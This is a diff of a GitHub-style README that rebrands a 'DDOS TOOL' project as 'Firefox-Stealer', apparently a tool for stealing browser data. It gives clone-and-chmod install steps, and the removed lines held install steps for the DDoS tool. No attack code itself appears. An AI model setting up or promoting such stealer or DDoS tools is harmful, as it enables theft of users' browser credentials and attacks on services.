@@ -1,37 +1,32 @@
 <h1 align="center">
-☆ᴍᴏʜᴀᴍᴍᴀᴅ ᴀʟᴀᴍɪɴ☆
+[ Nahid Alam ]
 </h1>
 
 <h2 align="center">
-☆DDOS TOOL☆
+Firefox-Stealer
 </h2>
 
-<p align="center">
-<a href="https://m.me/AK27X"><img title="Messenger" src="https://img.shields.io/badge/Chat-Messenger-blue?style=flat&logo=messenger"></a></p><br>
-<p align="center">
-<a href="https://fb.com/AK27X"><img title="Facebook" src="https://img.shields.io/badge/View-Facebook-blue?style=flat&logo=Facebook"></a></p><br>
-<p align="center">
-<a href="https://github.com/AK27X"><img title="Republic of Bangladesh" src="https://img.shields.io/badge/MADE%20IN-BANGLADESH-green?colorA=%23ff0000&colorB=%23017e40&style=flat"></a> 
+<a href="https://github.com/illusiondemon"><img title="Bangladesh" src="https://img.shields.io/badge/MADE%20IN-BANGLADESH-green?colorA=%23ff0000&colorB=%23017e40&style=flat"></a> 
 </p><br>
 
 <h2 align="center">
-☆INSTALL☆
+How To Install
 </h2>
 
 `
-pkg update && upgrade -y
+git clone https://github.com/illusiondemon/firefox-stealer.git
 `
 
 `
-pkg install git -y
+cd firefox-stealer
 `
 
 `
-git clone https://github.com/AK27X/ddos
+chmod +x *
 `
 
 `
-pkg install python -y
+
 `
 
 <h5 align="center">☆[RUN]☆<h5>
